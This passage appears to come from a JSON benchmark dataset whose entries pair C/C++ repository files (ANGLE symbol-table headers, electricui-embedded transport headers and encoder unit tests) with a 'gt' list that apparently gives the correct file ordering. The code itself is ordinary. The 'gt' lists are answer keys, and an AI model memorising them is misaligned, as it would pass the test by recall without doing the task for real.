TConstantUnion[type.getObjectSize()];\n\n        return unionArray;\n    }\n\n    TConstantUnion *getConstPointer() const\n    {\n        return unionArray;\n    }\n\n    void shareConstPointer(TConstantUnion *constArray)\n    {\n        if (unionArray == constArray)\n            return;\n\n        delete[] unionArray;\n        unionArray = constArray;\n    }\n\n  private:\n    TType type;\n    bool userType;\n\n\n    TConstantUnion *unionArray;\n};\n\n\nstruct TConstParameter\n{\n    TConstParameter()\n        : name(nullptr),\n          type(nullptr)\n    {\n    }\n    explicit TConstParameter(const TString *n)\n        : name(n),\n          type(nullptr)\n    {\n    }\n    explicit TConstParameter(const TType *t)\n        : name(nullptr),\n          type(t)\n    {\n    }\n    TConstParameter(const TString *n, const TType *t)\n        : name(n),\n          type(t)\n    {\n    }\n\n\n    TConstParameter(TString *n, TType *t) = delete;\n    TConstParameter(const TString *n, TType *t) = delete;\n    TConstParameter(TString *n, const TType *t) = delete;\n\n    const TString *name;\n    const TType *type;\n};\n\n\n\nstruct TParameter\n{\n\n\n\n    TConstParameter turnToConst()\n    {\n        const TString *constName = name;\n        const TType *constType = type;\n        name = nullptr;\n        type = nullptr;\n        return TConstParameter(constName, constType);\n    }\n\n    TString *name;\n    TType *type;\n};\n\n\nclass TFunction : public TSymbol\n{\n  public:\n    TFunction(const TString *name, const TType *retType, TOperator tOp = EOpNull, const char *ext = \"\")\n        : TSymbol(name),\n          returnType(retType),\n          mangledName(nullptr),\n          op(tOp),\n          defined(false)\n    {\n        relateToExtension(ext);\n    }\n    virtual ~TFunction();\n    virtual bool isFunction() const\n    {\n        return true;\n    }\n\n    static TString mangleName(const TString &name)\n    {\n        return name + '(';\n    }\n    static TString unmangleName(const TString &mangledName)\n    {\n        return TString(mangledName.c_str(), mangledName.find_first_of('('));\n    }\n\n    void addParameter(const TConstParameter &p)\n    {\n        parameters.push_back(p);\n        mangledName = nullptr;\n    }\n\n    const TString &getMangledName() const\n    {\n        if (mangledName == nullptr)\n        {\n            mangledName = buildMangledName();\n        }\n        return *mangledName;\n    }\n    const TType &getReturnType() const\n    {\n        return *returnType;\n    }\n\n    TOperator getBuiltInOp() const\n    {\n        return op;\n    }\n\n    void setDefined()\n    {\n        defined = true;\n    }\n    bool isDefined()\n    {\n        return defined;\n    }\n\n    size_t getParamCount() const\n    {\n        return parameters.size();\n    }\n    const TConstParameter &getParam(size_t i) const\n    {\n        return parameters[i];\n    }\n\n  private:\n    const TString *buildMangledName() const;\n\n    typedef TVector<TConstParameter> TParamList;\n    TParamList parameters;\n    const TType *returnType;\n    mutable const TString *mangledName;\n    TOperator op;\n    bool defined;\n};\n\n\nclass TInterfaceBlockName : public TSymbol\n{\n  public:\n    TInterfaceBlockName(const TString *name)\n        : TSymbol(name)\n    {\n    }\n\n    virtual ~TInterfaceBlockName()\n    {\n    }\n};\n\nclass TSymbolTableLevel\n{\n  public:\n    typedef TMap<TString, TSymbol *> tLevel;\n    typedef tLevel::const_iterator const_iterator;\n    typedef const tLevel::value_type tLevelPair;\n    typedef std::pair<tLevel::iterator, bool> tInsertResult;\n\n    TSymbolTableLevel()\n    {\n    }\n    ~TSymbolTableLevel();\n\n    bool insert(TSymbol *symbol);\n\n\n    bool insertUnmangled(TFunction *function);\n\n    TSymbol *find(const TString &name) const;\n\n  protected:\n    tLevel level;\n};\n\n\n\n\ntypedef int ESymbolLevel;\nconst int COMMON_BUILTINS = 0;\nconst int ESSL1_BUILTINS = 1;\nconst int ESSL3_BUILTINS = 2;\nconst int LAST_BUILTIN_LEVEL = ESSL3_BUILTINS;\nconst int GLOBAL_LEVEL = 3;\n\nclass TSymbolTable : angle::NonCopyable\n{\n  public:\n    TSymbolTable()\n        : mGlobalInvariant(false)\n    {\n\n\n\n    }\n\n    ~TSymbolTable();\n\n\n\n\n    bool isEmpty() const\n    {\n        return table.empty();\n    }\n    bool atBuiltInLevel() const\n    {\n        return currentLevel() <= LAST_BUILTIN_LEVEL;\n    }\n    bool atGlobalLevel() const\n    {\n        return currentLevel() <= GLOBAL_LEVEL;\n    }\n    void push()\n    {\n        table.push_back(new TSymbolTableLevel);\n        precisionStack.push_back(new PrecisionStackLevel);\n    }\n\n    void pop()\n    {\n        delete table.back();\n        table.pop_back();\n\n        delete precisionStack.back();\n        precisionStack.pop_back();\n    }\n\n    bool declare(TSymbol *symbol)\n    {\n        return insert(currentLevel(), symbol);\n    }\n\n    bool insert(ESymbolLevel level, TSymbol *symbol)\n    {\n        return table[level]->insert(symbol);\n    }\n\n    bool insert(ESymbolLevel level, const char *ext, TSymbol *symbol)\n    {\n        symbol->relateToExtension(ext);\n        return table[level]->insert(symbol);\n    }\n\n    bool insertConstInt(ESymbolLevel level, const char *name, int value)\n    {\n        TVariable *constant = new TVariable(\n            NewPoolTString(name), TType(EbtInt, EbpUndefined, EvqConst, 1));\n        constant->getConstPointer()->setIConst(value);\n        return insert(level, constant);\n    }\n\n    bool insertConstIntExt(ESymbolLevel level, const char *ext, const char *name, int value)\n    {\n        TVariable *constant =\n            new TVariable(NewPoolTString(name), TType(EbtInt, EbpUndefined, EvqConst, 1));\n        constant->getConstPointer()->setIConst(value);\n        return insert(level, ext, constant);\n    }\n\n    void insertBuiltIn(ESymbolLevel level, TOperator op, const char *ext, const TType *rvalue, const char *name,\n                       const TType *ptype1, const TType *ptype2 = 0, const TType *ptype3 = 0, const TType *ptype4 = 0, const TType *ptype5 = 0);\n\n    void insertBuiltIn(ESymbolLevel level, const TType *rvalue, const char *name,\n                       const TType *ptype1, const TType *ptype2 = 0, const TType *ptype3 = 0, const TType *ptype4 = 0, const TType *ptype5 = 0)\n    {\n        insertBuiltIn(level, EOpNull, \"\", rvalue, name, ptype1, ptype2, ptype3, ptype4, ptype5);\n    }\n\n    void insertBuiltIn(ESymbolLevel level, const char *ext, const TType *rvalue, const char *name,\n                       const TType *ptype1, const TType *ptype2 = 0, const TType *ptype3 = 0, const TType *ptype4 = 0, const TType *ptype5 = 0)\n    {\n        insertBuiltIn(level, EOpNull, ext, rvalue, name, ptype1, ptype2, ptype3, ptype4, ptype5);\n    }\n\n    void insertBuiltIn(ESymbolLevel level, TOperator op, const TType *rvalue, const char *name,\n                       const TType *ptype1, const TType *ptype2 = 0, const TType *ptype3 = 0, const TType *ptype4 = 0, const TType *ptype5 = 0)\n    {\n        insertBuiltIn(level, op, \"\", rvalue, name, ptype1, ptype2, ptype3, ptype4, ptype5);\n    }\n\n    TSymbol *find(const TString &name, int shaderVersion,\n                  bool *builtIn = NULL, bool *sameScope = NULL) const;\n    TSymbol *findBuiltIn(const TString &name, int shaderVersion) const;\n\n    TSymbolTableLevel *getOuterLevel()\n    {\n        assert(currentLevel() >= 1);\n        return table[currentLevel() - 1];\n    }\n\n    void dump(TInfoSink &infoSink) const;\n\n    bool setDefaultPrecision(const TPublicType &type, TPrecision prec)\n    {\n        if (!SupportsPrecision(type.type))\n            return false;\n        if (type.isAggregate())\n            return false;\n        int indexOfLastElement = static_cast<int>(precisionStack.size()) - 1;\n\n        (*precisionStack[indexOfLastElement])[type.type] = prec;\n        return true;\n    }\n\n\n\n    TPrecision getDefaultPrecision(TBasicType type) const;\n\n\n\n    void addInvariantVarying(const std::string &originalName)\n    {\n        mInvariantVaryings.insert(originalName);\n    }\n\n\n\n\n    bool isVaryingInvariant(const std::string &originalName) const\n    {\n      return (mGlobalInvariant ||\n              mInvariantVaryings.count(originalName) > 0);\n    }\n\n    void setGlobalInvariant() { mGlobalInvariant = true; }\n    bool getGlobalInvariant() const { return mGlobalInvariant; }\n\n    static int nextUniqueId()\n    {\n        return ++uniqueIdCounter;\n    }\n\n  private:\n    ESymbolLevel currentLevel() const\n    {\n        return static_cast<ESymbolLevel>(table.size() - 1);\n    }\n\n    std::vector<TSymbolTableLevel *> table;\n    typedef TMap<TBasicType, TPrecision> PrecisionStackLevel;\n    std::vector< PrecisionStackLevel *> precisionStack;\n\n    std::set<std::string> mInvariantVaryings;\n    bool mGlobalInvariant;\n\n    static int uniqueIdCounter;\n};\n\n#endif\n\n'freshplayerplugin/3rdparty/angle/src/compiler/translator/Initialize.h'\n:\n\n\n\n\n\n#ifndef COMPILER_TRANSLATOR_INITIALIZE_H_\n#define COMPILER_TRANSLATOR_INITIALIZE_H_\n\n#include \"compiler/translator/Common.h\"\n#include \"compiler/translator/Compiler.h\"\n#include \"compiler/translator/SymbolTable.h\"\n\nvoid InsertBuiltInFunctions(sh::GLenum type, ShShaderSpec spec, const ShBuiltInResources &resources, TSymbolTable &table);\n\nvoid IdentifyBuiltIns(sh::GLenum type, ShShaderSpec spec,\n                      const ShBuiltInResources& resources,\n                      TSymbolTable& symbolTable);\n\nvoid InitExtensionBehavior(const ShBuiltInResources& resources,\n                           TExtensionBehavior& extensionBehavior);\n\n\n\n\n\nvoid ResetExtensionBehavior(TExtensionBehavior &extensionBehavior);\n\n#endif\n",
        "gt": [
            "'freshplayerplugin/3rdparty/angle/src/common/debug.h'",
            "'freshplayerplugin/3rdparty/angle/src/compiler/translator/Common.h'",
            "'freshplayerplugin/3rdparty/angle/src/compiler/translator/InfoSink.h'",
            "'freshplayerplugin/3rdparty/angle/src/compiler/translator/SymbolTable.h'",
            "'freshplayerplugin/3rdparty/angle/src/compiler/translator/Initialize.h'"
        ]
    },
    {
        "files": [
            "'electricui-embedded/src/transports/eui_binary_transport.h'",
            "'electricui-embedded/src/transports/eui_transport_types.h'",
            "'electricui-embedded/test/test/transports/test_eui_serial_transport_encoder.c'"
        ],
        "content": "'electricui-embedded/src/transports/eui_binary_transport.h'\n:\n\n#ifndef EUI_BINARY_TRANSPORT_H\n#define EUI_BINARY_TRANSPORT_H\n\n\n\n#include <stdint.h>\n#include \"../eui_types.h\"\n#include \"eui_transport_types.h\"\n\n\nenum parseStates {\n    exp_frame_offset = 0,\n    exp_header_b1,\n    exp_header_b2,\n    exp_header_b3,\n    exp_message_id,\n    exp_offset_b1,\n    exp_offset_b2,\n    exp_data,\n    exp_crc_b1,\n    exp_crc_b2,\n};\n\n\nuint8_t\nencode_header( eui_header_t *header, uint8_t *buffer );\n\n\nuint8_t\nencode_framing( uint8_t *buffer, uint16_t size );\n\n\nuint8_t\nencode_packet_simple(   callback_data_out_t output_function,\n                        eui_pkt_settings_t  *settings,\n                        const char          *msg_id,\n                        uint16_t            payload_len,\n                        void*               payload);\n\n\nuint8_t\nencode_packet(  callback_data_out_t out_char,\n                eui_header_t        *header,\n                const char          *msg_id,\n                uint16_t            offset,\n                void*               payload );\n\n\nuint8_t\ndecode_packet(uint8_t inbound_byte, eui_packet_t *p_link_in);\n\n\nuint8_t\nparse_decoded_packet(uint8_t byte_in, eui_packet_t *p_link_in);\n\n#endif\n'electricui-embedded/src/transports/eui_transport_types.h'\n:\n\n#ifndef EUI_TRANSPORT_TYPES_H\n#define EUI_TRANSPORT_TYPES_H\n\n\n\n#include <stdint.h>\n#include \"../eui_types.h\"\n\n\n#define PACKET_BASE_SIZE    ( sizeof(eui_header_t) \\\n                            + sizeof(uint16_t) \\\n                            + sizeof(uint16_t) )\n\n\n#ifndef PAYLOAD_SIZE_MAX\n    #define PAYLOAD_SIZE_MAX  120\n#endif\n\n\n\ntypedef struct {\n    unsigned state          : 4;\n    unsigned id_bytes_in    : 4;\n    unsigned data_bytes_in  : 10;\n    uint8_t  frame_offset;\n} eui_parser_state_t;\n\n\ntypedef struct {\n    eui_parser_state_t parser;\n    eui_header_t header;\n\n    uint8_t     id_in[EUI_MAX_MSGID_SIZE];\n\n#ifndef EUI_CONF_OFFSETS_DISABLED\n    uint16_t    offset_in;\n#endif\n\n    uint16_t    crc_in;\n    uint8_t     data_in[PAYLOAD_SIZE_MAX];\n} eui_packet_t;\n\n#endif\n\n'electricui-embedded/test/test/transports/test_eui_serial_transport_encoder.c'\n:#include \"unity.h\"\n#include <string.h>\n\n\n#include \"eui_binary_transport.h\"\n#include \"eui_utilities.h\"\n\n\n\n\n\n\n\nuint8_t serial_buffer[1024] = { 0xFF };\nuint16_t serial_position    = 0;\nuint8_t encode_result       = 0;\n\n\nvoid byte_into_buffer( uint8_t *data, uint16_t len )\n{\n    for( uint16_t i = 0; i < len; i++ )\n    {\n        if( serial_position < 1024 )\n        {\n            serial_buffer[ serial_position ] = data[i];\n            serial_position++;\n        }\n        else\n        {\n            TEST_ASSERT_MESSAGE( 1, \"Mocked serial interface reports an issue\");\n        }\n    }\n}\n\n\n\nvoid setUp(void)\n{\n    memset(serial_buffer, 0xFF, sizeof(serial_buffer));\n    serial_position = 0;\n    encode_result = 0;\n}\n\nvoid tearDown(void)\n{\n\n}\n\n\n\nvoid test_encode_packet_simple( void )\n{\n\n    const char * test_message = \"abc\";\n    uint8_t test_payload[] = {\n        42,\n    };\n\n    eui_pkt_settings_t test_simple_header;\n    test_simple_header.internal  = 0;\n    test_simple_header.response  = 0;\n    test_simple_header.type      = 5;\n\n\n    encode_result = encode_packet_simple(&byte_into_buffer, &test_simple_header, test_message, sizeof(test_payload), &test_payload);\n\n\n    uint8_t expected[] = {\n        0x00,\n        0x0A,\n        0x01, 0x14, 0x03,\n        0x61, 0x62, 0x63,\n        0x2A,\n        0x64, 0xBA,\n        0x00\n    };\n\n    TEST_ASSERT_EQUAL_MESSAGE( sizeof(expected), serial_position, \"Unexpected number of output bytes\" );\n    TEST_ASSERT_EQUAL_UINT8_ARRAY( expected, serial_buffer, sizeof(expected) );\n    TEST_ASSERT_EQUAL_UINT8_MESSAGE( EUI_OUTPUT_OK, encode_result, \"Encoder didn't return expected status code\" );\n}\n\n\nvoid test_encode_packet( void )\n{\n\n    const char * test_message = \"abc\";\n    uint8_t test_payload[] = {\n        42,\n    };\n    uint16_t offset = 0;\n\n    eui_header_t test_header;\n    test_header.internal   = 0;\n    test_header.response   = 0;\n    test_header.type       = 5;\n    test_header.acknum     = 0;\n    test_header.offset     = (offset) ? 1 : 0;\n    test_header.id_len     = strlen(test_message);\n    test_header.data_len   = sizeof(test_payload);\n\n\n    encode_result = encode_packet( &byte_into_buffer, &test_header, test_message, offset, &test_payload );\n\n\n    uint8_t expected[] = {\n        0x00,\n        0x0A,\n        0x01, 0x14, 0x03,\n        0x61, 0x62, 0x63,\n\n        0x2A,\n        0x64, 0xBA,\n        0x00\n    };\n\n    TEST_ASSERT_EQUAL_MESSAGE( sizeof(expected), serial_position, \"Unexpected number of output bytes\" );\n    TEST_ASSERT_EQUAL_UINT8_ARRAY( expected, serial_buffer, sizeof(expected) );\n    TEST_ASSERT_EQUAL_UINT8_MESSAGE( EUI_OUTPUT_OK, encode_result, \"Encoder didn't return expected status code\" );\n}\n\nvoid test_encode_packet_short_id( void )\n{\n\n    const char * test_message = \"a\";\n    uint8_t test_payload[] = {\n        42,\n    };\n    uint16_t offset = 0;\n\n    eui_header_t test_header;\n    test_header.internal   = 0;\n    test_header.response   = 0;\n    test_header.type       = 5;\n    test_header.acknum     = 0;\n    test_header.offset     = (offset) ? 1 : 0;\n    test_header.id_len     = strlen(test_message);\n    test_header.data_len   = sizeof(test_payload);\n\n\n    encode_result = encode_packet( &byte_into_buffer, &test_header, test_message, offset, &test_payload );\n\n\n    uint8_t expected[] = {\n        0x00,\n        0x08,\n        0x01, 0x14, 0x01,\n        0x61,\n        0x2A,\n        0x08, 0xE0,\n        0x00\n    };\n\n    TEST_ASSERT_EQUAL_MESSAGE( sizeof(expected), serial_position, \"Unexpected number of output bytes\" );\n    TEST_ASSERT_EQUAL_UINT8_ARRAY( expected, serial_buffer, sizeof(expected) );\n    TEST_ASSERT_EQUAL_UINT8_MESSAGE( EUI_OUTPUT_OK, encode_result, \"Encoder didn't return expected status code\" );\n}\n\nvoid test_encode_packet_long_id( void )\n{\n\n    const char * test_message = \"abcdefghijklmno\";\n    uint8_t test_payload[] = {\n        42,\n    };\n    uint16_t offset = 0;\n\n    eui_header_t test_header;\n    test_header.internal   = 0;\n    test_header.response   = 0;\n    test_header.type       = 5;\n    test_header.acknum     = 0;\n    test_header.offset     = (offset) ? 1 : 0;\n    test_header.id_len     = strlen(test_message);\n    test_header.data_len   = sizeof(test_payload);\n\n\n    encode_result = encode_packet( &byte_into_buffer, &test_header, test_message, offset, &test_payload );\n\n\n    uint8_t expected[] = {\n        0x00,\n        0x16,\n        0x01, 0x14, 0x0f,\n        0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6a, 0x6b, 0x6c, 0x6d, 0x6e, 0x6f,\n        0x2A,\n        0x05, 0x8B,\n        0x00\n    };\n\n    TEST_ASSERT_EQUAL_MESSAGE( sizeof(expected), serial_position, \"Unexpected number of output bytes\" );\n    TEST_ASSERT_EQUAL_UINT8_ARRAY( expected, serial_buffer, sizeof(expected) );\n    TEST_ASSERT_EQUAL_UINT8_MESSAGE( EUI_OUTPUT_OK, encode_result, \"Encoder didn't return expected status code\" );\n}\n\nvoid test_encode_packet_internal( void )\n{\n\n    const char * test_message = \"abc\";\n    uint8_t test_payload[] = {\n        42,\n    };\n    uint16_t offset = 0;\n\n    eui_header_t test_header;\n    test_header.internal   = 1;\n    test_header.response   = 0;\n    test_header.type       = 5;\n    test_header.acknum     = 0;\n    test_header.offset     = (offset) ? 1 : 0;\n    test_header.id_len     = strlen(test_message);\n    test_header.data_len   = sizeof(test_payload);\n\n\n    encode_result = encode_packet( &byte_into_buffer, &test_header, test_message, offset, &test_payload );\n\n\n    uint8_t expected[] = {\n        0x00,\n        0x0A,\n        0x01, 0x54, 0x03,\n        0x61, 0x62, 0x63,\n        0x2A,\n        0x74, 0xD0,\n        0x00\n    };\n\n    TEST_ASSERT_EQUAL_MESSAGE( sizeof(expected), serial_position, \"Unexpected number of output bytes\" );\n    TEST_ASSERT_EQUAL_UINT8_ARRAY( expected, serial_buffer, sizeof(expected) );\n    TEST_ASSERT_EQUAL_UINT8_MESSAGE( EUI_OUTPUT_OK, encode_result, \"Encoder didn't return expected status code\" );\n}\n\nvoid test_encode_packet_response( void )\n{\n\n    const char * test_message = \"abc\";\n    uint8_t test_payload[] = {\n        42,\n    };\n    uint16_t offset = 0;\n\n    eui_header_t test_header;\n    test_header.internal   = 0;\n    test_header.response   = 1;\n    test_header.type       = 5;\n    test_header.acknum     = 0;\n    test_header.offset     = (offset) ? 1 : 0;\n    test_header.id_len     = strlen(test_message);\n    test_header.data_len   = sizeof(test_payload);\n\n\n    encode_result = encode_packet( &byte_into_buffer, &test_header, test_message, offset, &test_payload );\n\n\n    uint8_t expected[] = {\n        0x00,\n        0x0A,\n        0x01, 0x14, 0x13,\n        0x61, 0x62, 0x63,\n        0x2A,\n        0x3E, 0xBE,\n        0x00\n    };\n\n    TEST_ASSERT_EQUAL_MESSAGE( sizeof(expected), serial_position, \"Unexpected number of output bytes\" );\n    TEST_ASSERT_EQUAL_UINT8_ARRAY( expected, serial_buffer, sizeof(expected) );\n    TEST_ASSERT_EQUAL_UINT8_MESSAGE( EUI_OUTPUT_OK, encode_result, \"Encoder didn't return expected status code\" );\n}\n\nvoid test_encode_packet_acknum( void )\n{\n\n    const char * test_message = \"abc\";\n    uint8_t test_payload[] = {\n        42,\n    };\n    uint16_t offset = 0;\n\n    eui_header_t test_header;\n    test_header.internal   = 0;\n    test_header.response   = 0;\n    test_header.type       = 5;\n    test_header.acknum     = 3;\n    test_header.offset     = (offset) ? 1 : 0;\n    test_header.id_len     = strlen(test_message);\n    test_header.data_len   = sizeof(test_payload);\n\n\n    encode_result = encode_packet( &byte_into_buffer, &test_header, test_message, offset, &test_payload );\n\n\n    uint8_t expected[] = {\n        0x00,\n        0x0A,\n        0x01, 0x14, 0x63,\n        0x61, 0x62, 0x63,\n        0x2A,\n        0xB8, 0xA3,\n        0x00\n    };\n\n    TEST_ASSERT_EQUAL_MESSAGE( sizeof(expected), serial_position, \"Unexpected number of output bytes\" );\n    TEST_ASSERT_EQUAL_UINT8_ARRAY( expected, serial_buffer, sizeof(expected) );\n    TEST_ASSERT_EQUAL_UINT8_MESSAGE( EUI_OUTPUT_OK, encode_result, \"Encoder didn't return expected status code\" );\n}\n\nvoid test_encode_packet_float( void )\n{\n\n    const char * test_message = \"abc\";\n    uint8_t test_payload[] = {\n        0x14, 0xAE, 0x29, 0x42\n    };\n    uint16_t offset = 0;\n\n    eui_header_t test_header;\n    test_header.internal   = 0;\n    test_header.response   = 0;\n    test_header.type       = 11;\n    test_header.acknum     = 0;\n    test_header.offset     = (offset) ? 1 : 0;\n    test_header.id_len     = strlen(test_message);\n    test_header.data_len   = sizeof(test_payload);\n\n\n    encode_result = encode_packet( &byte_into_buffer, &test_header, test_message, offset, &test_payload );\n\n\n    uint8_t expected[] = {\n        0x00,\n        0x0D,\n        0x04, 0x2c, 0x03,\n        0x61, 0x62, 0x63,\n        0x14, 0xAE, 0x29, 0x42,\n        0x8B, 0x1D,\n        0x00\n    };\n\n    TEST_ASSERT_EQUAL_MESSAGE( sizeof(expected), serial_position, \"Unexpected number of output bytes\" );\n    TEST_ASSERT_EQUAL_UINT8_ARRAY( expected, serial_buffer, sizeof(expected) );\n    TEST_ASSERT_EQUAL_UINT8_MESSAGE( EUI_OUTPUT_OK, encode_result, \"Encoder didn't return expected status code\" );\n}\n\nvoid test_encode_packet_offset_last( void )\n{\n\n    const char * test_message = \"abc\";\n    uint8_t test_payload[] = {\n        0x14, 0xAE, 0x29, 0x42\n    };\n    uint16_t offset = 0;\n\n    eui_header_t test_header;\n    test_header.internal   = 0;\n    test_header.response   = 0;\n    test_header.type       = 11;\n    test_header.acknum     = 0;\n    test_header.offset     = 1;\n    test_header.id_len     = strlen(test_message);\n    test_header.data_len   = sizeof(test_payload);\n\n\n    encode_result = encode_packet( &byte_into_buffer, &test_header, test_message, offset, &test_payload );\n\n\n    uint8_t expected[] = {\n        0x00,\n        0x07,\n        0x04, 0xAC, 0x03,\n        0x61, 0x62, 0x63,\n        0x01, 0x07,\n        0x14, 0xAE, 0x29, 0x42,\n        0x48, 0x31,\n        0x00\n    };\n\n    TEST_ASSERT_EQUAL_MESSAGE( sizeof(expected), serial_position, \"Unexpected number of output bytes\" );\n    TEST_ASSERT_EQUAL_UINT8_ARRAY( expected, serial_buffer, sizeof(expected) );\n    TEST_ASSERT_EQUAL_UINT8_MESSAGE( EUI_OUTPUT_OK, encode_result, \"Encoder didn't return expected status code\" );\n}\n\n\nvoid test_encode_packet_offset( void )\n{\n\n    const char * test_message = \"abc\";\n    uint8_t test_payload[] = {\n        0x14, 0xAE, 0x29, 0x42\n    };\n    uint16_t offset = 2;\n\n    eui_header_t test_header;\n    test_header.internal   = 0;\n    test_header.response   = 0;\n    test_header.type       = 5;\n    test_header.acknum     = 0;\n    test_header.offset     = 1;\n    test_header.id_len     = strlen(test_message);\n    test_header.data_len   = 2;\n\n\n    encode_result = encode_packet( &byte_into_buffer, &test_header, test_message, offset, &test_payload );\n\n\n    uint8_t expected[] = {\n        0x00,\n        0x08,\n        0x02, 0x94, 0x03,\n        0x61, 0x62, 0x63,\n        0x02, 0x05,\n        0x29, 0x42,\n        0xD8, 0x96,\n        0x00\n    };\n\n    TEST_ASSERT_EQUAL_MESSAGE( sizeof(expected), serial_position, \"Unexpected number of output bytes\" );\n    TEST_ASSERT_EQUAL_UINT8_ARRAY( expected, serial_buffer, sizeof(expected) );\n    TEST_ASSERT_EQUAL_UINT8_MESSAGE( EUI_OUTPUT_OK, encode_result, \"Encoder didn't return expected status code\" );\n}\n\n\nvoid test_encode_packet_large( void )\n{\n\n    const char * test_message = \"abc\";\n    uint8_t test_payload[] = {\n        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F,\n        0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F,\n        0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F,\n        0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3A, 0x3B, 0x3C, 0x3D, 0x3E, 0x3F,\n        0x40, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F,\n        0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5A, 0x5B, 0x5C, 0x5D, 0x5E, 0x5F,\n        0x60, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6A, 0x6B, 0x6C, 0x6D, 0x6E, 0x6F,\n        0x00\n    };\n\n    uint16_t offset = 0;\n\n    eui_header_t test_header;\n    test_header.internal   = 0;\n    test_header.response   = 0;\n    test_header.type       = 5;\n    test_header.acknum     = 0;\n    test_header.offset     = 0;\n    test_header.id_len     = strlen(test_message);\n    test_header.data_len   = 112;\n\n\n    encode_result = encode_packet( &byte_into_buffer, &test_header, test_message, offset, &test_payload );\n\n\n    uint8_t expected[] = {\n        0x00,\n        0x07,\n        0x70, 0x14, 0x03,\n        0x61, 0x62, 0x63,\n        0x72, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F,\n        0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F,\n        0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F,\n        0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3A, 0x3B, 0x3C, 0x3D, 0x3E, 0x3F,\n        0x40, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F,\n        0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5A, 0x5B, 0x5C, 0x5D, 0x5E, 0x5F,\n        0x60, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6A, 0x6B, 0x6C, 0x6D, 0x6E, 0x6F,\n        0xBE, 0xF4,\n        0x00\n    };\n\n    TEST_ASSERT_EQUAL_MESSAGE( sizeof(expected), serial_position, \"Unexpected number of output bytes\" );\n    TEST_ASSERT_EQUAL_UINT8_ARRAY( expected, serial_buffer, sizeof(expected) );\n    TEST_ASSERT_EQUAL_UINT8_MESSAGE( EUI_OUTPUT_OK, encode_result, \"Encoder didn't return expected status code\" );\n}\n\nvoid test_encode_packet_null_output_pointer( void )\n{\n\n    const char * test_message = \"abc\";\n    uint8_t test_payload[] = {\n        42,\n    };\n    uint16_t offset = 0;\n\n    eui_header_t test_header;\n    test_header.internal   = 0;\n    test_header.response   = 0;\n    test_header.type       = 5;\n    test_header.acknum     = 0;\n    test_header.offset     = (offset) ? 1 : 0;\n    test_header.id_len     = 0;\n    test_header.data_len   = sizeof(test_payload);\n\n\n    encode_result = encode_packet( 0, &test_header, 0, offset, &test_payload );\n\n    TEST_ASSERT_NOT_EQUAL( EUI_PARSER_ERROR, encode_result );\n}\n\nvoid test_encode_packet_null_header( void )\n{\n\n    const char * test_message = \"abc\";\n    uint8_t test_payload[] = {\n        42,\n    };\n    uint16_t offset = 0;\n\n\n\n\n    encode_result = encode_packet( &byte_into_buffer, 0, test_message, offset, &test_payload );\n\n    TEST_ASSERT_NOT_EQUAL( EUI_PARSER_ERROR, encode_result );\n}\n\nvoid test_encode_packet_null_id( void )\n{\n\n    uint8_t test_payload[] = {\n        42,\n    };\n    uint16_t offset = 0;\n\n    eui_header_t test_header;\n    test_header.internal   = 0;\n    test_header.response   = 0;\n    test_header.type       = 5;\n    test_header.acknum     = 0;\n    test_header.offset     = (offset) ? 1 : 0;\n    test_header.id_len     = 0;\n    test_header.data_len   = sizeof(test_payload);\n\n\n    encode_result = encode_packet( &byte_into_buffer, &test_header, 0, offset, &test_payload );\n\n    TEST_ASSERT_NOT_EQUAL( EUI_PARSER_ERROR, encode_result );\n}\n\nvoid test_encode_packet_null_data_pointer( void )\n{\n\n    const char * test_message = \"abc\";\n    uint8_t test_payload[] = {\n        42,\n    };\n    uint16_t offset = 0;\n\n    eui_header_t test_header;\n    test_header.internal   = 0;\n    test_header.response   = 0;\n    test_header.type       = 5;\n    test_header.acknum     = 0;\n    test_header.offset     = (offset) ? 1 : 0;\n    test_header.id_len     = strlen(test_message);\n    test_header.data_len   = sizeof(test_payload);\n\n\n    encode_result = encode_packet( &byte_into_buffer, &test_header, test_message, offset, 0 );\n\n    TEST_ASSERT_NOT_EQUAL( EUI_PARSER_ERROR, encode_result );\n}\n\nvoid test_encode_packet_null_everything( void )\n{\n    encode_result = encode_packet( 0, 0, 0, 0, 0 );\n\n    TEST_ASSERT_NOT_EQUAL( EUI_PARSER_ERROR, encode_result );\n}\n\n",
        "gt": [
            "'electricui-embedded/src/transports/eui_transport_types.h'",
            "'electricui-embedded/src/transports/eui_binary_transport.h'",
            "'electricui-embedded/test/test/transports/test_eui_serial_transport_encoder.c'"
        ]
    },
    {
        "files": [
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'",
